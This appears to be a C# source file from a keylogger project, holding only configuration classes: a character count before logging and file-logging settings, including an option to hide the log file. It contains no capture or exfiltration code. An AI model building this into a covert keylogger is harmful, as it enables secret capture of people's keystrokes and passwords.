namespace key_logger
{
    public class Configuration
    {
        public int QtdCharBeforeLog { get; set; }
        public Log Log { get; set; }
    }

    public class Log
    {
        public bool EnableFileLog { get; set; }
        public bool HideFile { get; set; }
        public string Path { get; set; }
    }
}
